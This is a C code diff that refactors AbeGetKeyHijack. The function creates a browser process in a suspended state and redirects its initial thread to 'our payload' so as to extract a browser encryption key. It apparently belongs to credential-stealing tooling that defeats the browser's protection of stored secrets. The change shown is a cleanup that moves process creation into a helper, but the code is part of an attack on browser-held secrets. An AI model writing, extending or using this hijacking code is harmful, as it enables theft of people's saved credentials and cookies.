@@ -2,36 +2,23 @@
 
 /*** method: Hijack (suspended browser initial thread redirected to our payload) ***/
 
+_Success_(return)
 BOOL
 AbeGetKeyHijack(
     _In_ const NET_BROWSER_INFO* Browser,
-    _In_ ULONG BrowserIndex,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
 {
     PVOID Self = (PVOID)&__ImageBase;
-    STARTUPINFOW Si;
     PROCESS_INFORMATION Pi;
     CONTEXT Ctx = { 0 };
     PVOID Mapped = NULL;
     LONG Code = (LONG)E_FAIL;
 
-    if (!AbePrepareRequest(Browser, BrowserIndex)) return FALSE;
-
-    RtlZeroMemory(&Si, sizeof(Si));
-    RtlZeroMemory(&Pi, sizeof(Pi));
-    Si.cb = sizeof(Si);
-    if (!CreateProcessInternalW(NULL,
-                                Browser->ExePath,
-                                NULL,
-                                NULL,
-                                NULL,
-                                FALSE,
-                                CREATE_SUSPENDED,
-                                NULL,
-                                NULL,
-                                &Si,
-                                &Pi,
-                                NULL))
+    if (!AbePrepareRequest(Browser))
+    {
+        return FALSE;
+    }
+    if (!AbeCreateBrowserProcess(Browser->ExePath, CREATE_SUSPENDED, &Pi))
     {
         AbeLog(L"Hijack: failed to create browser process, gle=%lu\r\n", Err_GetLastError());
         return FALSE;
